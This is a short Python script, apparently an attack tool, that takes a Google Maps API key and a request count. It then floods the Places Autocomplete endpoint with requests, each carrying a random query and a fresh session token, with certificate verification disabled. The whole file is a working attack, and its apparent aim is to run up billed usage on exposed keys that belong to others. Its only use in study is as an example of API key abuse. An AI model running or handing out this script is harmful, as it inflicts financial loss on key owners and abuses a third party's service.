#!/usr/bin/python3
import requests, warnings, json, sys, os, random, colorama, uuid
from string import ascii_lowercase
from colorama import Fore
requests.packages.urllib3.disable_warnings()
colorama.init(autoreset=True)

def generate_url(apikey):
   phrase = "".join(random.choices(ascii_lowercase, k=3))
   session_token = str(uuid.uuid4())
   return f"https://maps.googleapis.com/maps/api/place/autocomplete/json?input={phrase}&types=political|country|continent|street_number|administrative_area_level_4&sessiontoken={session_token}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to autocomplete session: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    for i in range(count):
        url = generate_url(apikey)
        response = requests.get(url, verify=False)
        if response.text.find("error_message") < 0:
            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
        else:
            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")

if __name__ == "__main__":
    do_attack()

